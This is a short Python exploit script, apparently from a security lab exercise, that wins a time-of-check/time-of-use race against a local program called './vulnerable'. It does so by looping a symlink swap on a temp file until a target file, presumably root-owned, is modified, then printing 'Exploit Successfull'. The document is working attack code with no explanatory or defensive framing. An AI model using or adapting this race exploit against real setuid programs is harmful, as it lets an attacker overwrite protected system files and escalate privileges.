#!/usr/bin/env python3

import sys
import os
import subprocess


def getSize(fileName):
	statinfo = os.stat(fileName)
	return statinfo.st_size


fileName = sys.argv[1]
originalSize = getSize(fileName)

print("[+] Starting exploit of file ", fileName)

while getSize(fileName) == originalSize:
	try:
		os.unlink("temp.file")
	except OSError:
		pass
	file = open("temp.file", "w+")
	file.write("Bogus file\n")
	file.close()
	subprocess.Popen(['echo "User_modified_root_file" | ./vulnerable temp.file &'], shell=True) 
	os.symlink(fileName, "auxLink")
	os.replace("auxLink", "temp.file")

print("File size changed from: ", originalSize, " to: ", getSize(fileName), ".\n [+] Exploit Successfull [+]")
